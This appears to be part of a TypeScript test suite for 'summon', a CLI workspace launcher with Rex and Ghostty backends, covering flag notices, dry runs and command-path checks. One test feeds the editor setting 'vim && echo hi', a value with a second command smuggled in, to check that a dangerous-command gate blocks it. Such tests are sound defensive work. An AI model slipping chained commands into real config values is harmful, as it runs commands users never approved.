    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["maximize", "true"], ["float", "true"], ["fullscreen", "true"], ["font-size", "14"], ["clean", "true"], ["new-window", "true"]]));
    mockReadKVFile.mockReturnValue(new Map([["maximize", "true"], ["font-size", "16"]]));
    await launch("/tmp/workspace");
    expect(stderrText).not.toContain("Rex cannot honor");
    expect(mockCreateRexBackend).toHaveBeenCalledWith(REX_CONTEXT, expect.objectContaining({ newWindow: false }));
  });

  it("prints one P8 notice per flag Rex cannot honor when the flag is given on the command line", async () => {
    await launch("/tmp/workspace", { maximize: "true", float: "true", fullscreen: "true", "font-size": "14", clean: "true", "new-window": "true" });
    for (const flag of ["maximize", "float", "fullscreen", "font-size", "clean"]) expect(stderrText).toContain(`summon: note: Rex cannot honor ${flag}; ignored`);
    expect(stderrText.match(/Rex cannot honor/g)).toHaveLength(5);
    expect(stderrText).not.toContain("Rex cannot honor new-window");
    expect(mockCreateRexBackend).toHaveBeenCalledWith(REX_CONTEXT, expect.objectContaining({ newWindow: true }));
  });

  it("still discloses an on-stop hook under Rex, marked routine for the D1 watch", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"], ["on-stop", "echo bye"]]));
    await launch("/tmp/workspace");
    expect(stderrText).toContain("summon: note: on-stop will run on workspace exit.\n");
    expect(routineText).toBe("summon: note: on-stop will run on workspace exit.\n");
  });

  it("prints the adoption notices for a launch, marked routine only where adoptOrphansForLaunch says so (D1)", async () => {
    mockAdoptOrphansForLaunch.mockReturnValue([{ text: "removed the files of earlier launch x (its Rex session is gone)", routine: true }, { text: "adopted earlier launch y" }]);
    await launch("/tmp/workspace");
    expect(stderrText).toContain("summon: note: removed the files of earlier launch x (its Rex session is gone)\nsummon: note: adopted earlier launch y\n");
    expect(routineText).toBe("summon: note: removed the files of earlier launch x (its Rex session is gone)\n");
  });

  it("a dry run with an active Rex record calls neither adoptOrphans nor the switch decision nor any rex process, and prints the request plus the note", async () => {
    mockReadStatusRecord.mockReturnValue({ project: "workspace", backend: "rex", rex: REX_IDENTITY });
    mockSessionState.mockReturnValue({ state: "active", liveBlocks: ["editor"] });
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
    await launch("/tmp/workspace", { dryRun: true });
    const output = String(logSpy.mock.calls.at(-1)?.[0]);
    logSpy.mockRestore();
    expect(output).toContain("-- Note: workspace is recorded as a Rex workspace (session:0000aaaa-0000-0000-0000-000000000001)");
    expect(output).toContain('"initial_windows"');
    expect(mockAdoptOrphansForLaunch).not.toHaveBeenCalled();
    expect(mockMaybeSwitch).not.toHaveBeenCalled();
    expect(mockSessionState).not.toHaveBeenCalled();
    expect(rexLaunches).toEqual([]);
    expect(rexCalls()).toEqual([]);
    expect(statusModule.publishStatus).not.toHaveBeenCalled();
  });

  it("a non-TTY launch under Rex keeps the dangerous-command gate", async () => {
    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim && echo hi"]]));
    const origIsTTY = process.stdin.isTTY;
    Object.defineProperty(process.stdin, "isTTY", { value: false, configurable: true });
    try {
      await expect(launch("/tmp/workspace")).rejects.toThrow();
    } finally {
      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
    }
    expect(stderrText).toContain("interactive confirmation");
    expect(mockAdoptOrphansForLaunch).toHaveBeenCalledWith("workspace");
    expect(rexLaunches).toEqual([]);
    expect(statusModule.publishStatus).not.toHaveBeenCalled();
  });

  it("a Ghostty launch over a live Rex session of the same project warns and goes on", async () => {
    mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "ghostty", placement: "outside", notices: [] });
    mockReadStatusRecord.mockReturnValue({ project: "workspace", backend: "rex", rex: REX_IDENTITY });
    mockSessionState.mockReturnValue({ state: "partial", reason: "root pane closed", liveBlocks: ["editor-2"] });
    await launch("/tmp/workspace");
    expect(stderrText).toContain("summon: note: Rex session [workspace] session:0000aaaa-0000-0000-0000-000000000001 is still running; rex kill session:0000aaaa-0000-0000-0000-000000000001 closes it");
    expect(mockAdoptOrphansForLaunch).not.toHaveBeenCalled();
    expect(statusModule.publishStatus).toHaveBeenCalledWith(expect.objectContaining({ backend: "ghostty" }));
    mockSessionState.mockReturnValue({ state: "stopped", liveBlocks: [] });
    stderrText = "";
    await launch("/tmp/workspace");
    expect(stderrText).not.toContain("is still running");
  });
});

describe("absolute command paths and fix hints", () => {
  const useTreeLayout = (enhance: string): void => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(
      new Map([
        ["tree", "main | enhance"],
        ["pane.main", "claude"],
        ["pane.enhance", enhance],
      ]),
    );
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
  };
  const whichMissing = (name: string): void => {
    mockExecFileSync.mockImplementation((bin: string, args?: string[]) => {
      if (bin === "/usr/bin/which" && args?.[0] === name) throw new Error("not found");
      if (bin === "/usr/bin/which") return "/usr/bin/stub\n";
      return "";
    });
  };
  const stderrOf = async (run: () => Promise<unknown>): Promise<string> => {
    const writeSpy = vi.spyOn(process.stderr, "write").mockImplementation(() => true);
    try {
      await run();
      // Read the calls before mockRestore, which clears them
      return writeSpy.mock.calls.map((c) => String(c[0])).join("");
    } finally {
      writeSpy.mockRestore();
    }
  };

  it("launches a tree pane whose command is an executable absolute path (T1.4)", async () => {
    useTreeLayout("/opt/homebrew/bin/gh-glance");
    mockStatSync.mockImplementation(() => ({ isFile: () => true }));

    await launch("/tmp/workspace");

    expect(mockStatSync).toHaveBeenCalledWith("/opt/homebrew/bin/gh-glance");
    expect(mockExecFileSync).not.toHaveBeenCalledWith("/usr/bin/which", ["/opt/homebrew/bin/gh-glance"], expect.anything());
    expect(JSON.stringify(mockGenerateTreeAppleScript.mock.calls[0]?.[0])).toContain("/opt/homebrew/bin/gh-glance");
  });

  it("stops with a missing-path message and a layout hint, without an install prompt (T1.5)", async () => {
    useTreeLayout("/opt/homebrew/bin/nope");

    const text = await stderrOf(() => expect(launch("/tmp/workspace")).rejects.toThrow());

    expect(text).toContain("`/opt/homebrew/bin/nope` was not found or is not executable.");
    expect(text).toContain("summon layout edit mywork");
    expect(text).not.toContain("summon set");
    expect(mockQuestion).not.toHaveBeenCalled();
  });

  it("rejects a home-relative path with the rule, without an install prompt (T1.6)", async () => {
    useTreeLayout("~/bin/tool --flag");

    const text = await stderrOf(() => expect(launch("/tmp/workspace")).rejects.toThrow());

    expect(text).toContain("`~/bin/tool` is not a command name or an absolute path.");
    expect(text).toContain("full path that starts with `/`");
    expect(mockQuestion).not.toHaveBeenCalled();
  });

  it("names the layout file, not summon set, for a missing bare command in a tree pane (T1.7)", async () => {
    useTreeLayout("nope-tool");
    whichMissing("nope-tool");

    const text = await stderrOf(() => expect(launch("/tmp/workspace")).rejects.toThrow());

    expect(text).toContain("is required but not installed, and no known install method was found.");
    expect(text).toContain("`pane.enhance=` in layout mywork: summon layout edit mywork");
    expect(text).not.toContain("summon set enhance");
  });

  it("names the layout file when an install is declined for a tree pane (T1.8)", async () => {
    mockIsCustomLayout.mockReturnValue(true);
    mockReadCustomLayout.mockReturnValue(new Map([["tree", "main | sidebar"], ["pane.main", "claude"], ["pane.sidebar", "lazygit"]]));
    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
    whichMissing("lazygit");
    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("n"));
    const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});

    await expect(launch("/tmp/workspace")).rejects.toThrow();

    const logged = logSpy.mock.calls.map((c) => String(c[0])).join("\n");
    logSpy.mockRestore();
    expect(logged).toContain("summon layout edit mywork");
    expect(logged).not.toContain("summon set sidebar");
  });

  describe("dry-run command check (Phase 2)", () => {
    const dryRunOutput = async (): Promise<{ stdout: string; notes: string[] }> => {
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
      try {
        const stderr = await stderrOf(() => launch("/tmp/workspace", { dryRun: true }));
        const notes = stderr.split("\n").filter((line) => line.startsWith("summon: note:") && line.includes("a real launch"));
        return { stdout: logSpy.mock.calls.map((c) => String(c[0])).join("\n"), notes };
      } finally {
        logSpy.mockRestore();
      }
    };

    it("notes a missing absolute pane command and still prints the script (T2.1)", async () => {
      useTreeLayout("/opt/homebrew/bin/nope");

      const { stdout, notes } = await dryRunOutput();

      expect(stdout).toContain("-- tree layout");
      expect(notes).toEqual(["summon: note: pane `enhance`: `/opt/homebrew/bin/nope` was not found or is not executable; a real launch stops here."]);
      expect(mockQuestion).not.toHaveBeenCalled();
      expect(mockExecFileSync).not.toHaveBeenCalledWith("osascript", expect.anything(), expect.anything());
    });

    it("notes a missing command once per executable and labels config keys (T2.2)", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "nope-tool --wait"], ["sidebar", "nope-tool"], ["shell", "./bin/tool"]]));
      whichMissing("nope-tool");

      const { notes } = await dryRunOutput();

      expect(notes).toEqual([
        "summon: note: `editor`: `nope-tool` is not on your PATH; a real launch stops here.",
        "summon: note: `shell`: `./bin/tool` is not a command name or an absolute path; a real launch stops here.",
      ]);
    });

    it("says a real launch offers an install for a missing command it knows how to install", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "claude"]]));
      whichMissing("claude");

      const { notes } = await dryRunOutput();

      expect(notes).toEqual(["summon: note: `editor`: `claude` is not on your PATH; a real launch offers to install it."]);
      expect(mockQuestion).not.toHaveBeenCalled();
      expect(mockExecFileSync).not.toHaveBeenCalledWith("npm", expect.anything(), expect.anything());
    });

    it("treats an inherited object name as a command with no install method", async () => {
      vi.mocked(listConfig).mockReturnValue(new Map([["editor", "toString"]]));
      whichMissing("toString");

      expect((await dryRunOutput()).notes).toEqual(["summon: note: `editor`: `toString` is not on your PATH; a real launch stops here."]);
      const text = await stderrOf(() => expect(launch("/tmp/workspace")).rejects.toThrow("is required but not installed"));
      expect(text).toContain("no known install method was found");
    });

    it("does not check commands under Rex (T2.3)", async () => {
      useTreeLayout("/opt/homebrew/bin/nope");
      mockResolveBackendForLaunch.mockReturnValue({ ok: true, backend: "rex", placement: "inside-rex", server: "unix:///tmp/rex.sock", rexBinary: "/usr/local/bin/rex", notices: [] });

      const { stdout, notes } = await dryRunOutput();

      expect(stdout).toContain("-- Backend: rex");
      expect(notes).toEqual([]);
      expect(mockStatSync).not.toHaveBeenCalled();
    });

    it("prints no note when every command resolves (T2.4)", async () => {
      useTreeLayout("/opt/homebrew/bin/gh-glance");
      mockStatSync.mockImplementation(() => ({ isFile: () => true }));

      expect((await dryRunOutput()).notes).toEqual([]);

      useTreeLayout("vim");
      expect((await dryRunOutput()).notes).toEqual([]);
    });

    it("lists the same keys, in the same order, that the Ghostty backend resolves, and stores each result back (T2.5)", async () => {
      const resolvedKeys = async (launchWith: (ctx: BackendLaunchContext) => Promise<unknown>): Promise<string[]> => {
        const ensureAndResolve = vi.fn(async (cmd: string, _key: string) => `/r/${cmd}`);
        const ctx: BackendLaunchContext = {
          targetDir: "/tmp/workspace",
          envVars: undefined,
          projectName: "workspace",
          onStop: undefined,
          launchId: "l-1",
          layoutLabel: "custom",
          ensureAndResolve,
          resolveStarship: () => null,
        };
        const outSpy = vi.spyOn(process.stdout, "write").mockImplementation(() => true);
        try {
          await stderrOf(() => launchWith(ctx));
        } finally {
          outSpy.mockRestore();
        }
        return ensureAndResolve.mock.calls.map((c) => c[1]);
      };

      const plan = planLayout({ editor: "vim", sidebarCommand: "lazygit", secondaryEditor: "nvim", shell: "htop" });
      const traditionalKeys = ghosttyCommandEntries({ kind: "traditional", plan }).map((e) => e.key);
      expect(traditionalKeys).toEqual(["editor", "sidebar", "editor", "shell"]);
      expect(await resolvedKeys((ctx) => GhosttyBackend.launchTraditional(plan, ctx))).toEqual(traditionalKeys);
      expect([plan.editor, plan.sidebarCommand, plan.secondaryEditor, plan.shellCommand]).toEqual(["/r/vim", "/r/lazygit", "/r/nvim", "/r/htop"]);

      const treePlan = buildTreePlan(resolveTreeCommands(parseTreeDSL("a | b | c"), new Map([["a", "vim"], ["b", ""], ["c", "htop"]])));
      const treeKeys = ghosttyCommandEntries({ kind: "tree", plan: treePlan }).map((e) => e.key);
      expect(treeKeys).toEqual(["pane.a", "pane.c"]);
      expect(await resolvedKeys((ctx) => GhosttyBackend.launchTree(treePlan, ctx))).toEqual(treeKeys);
      expect(["a", "b", "c"].map((name) => findPaneByName(treePlan.tree, name)?.command)).toEqual(["/r/vim", "", "/r/htop"]);
    });
  });
});
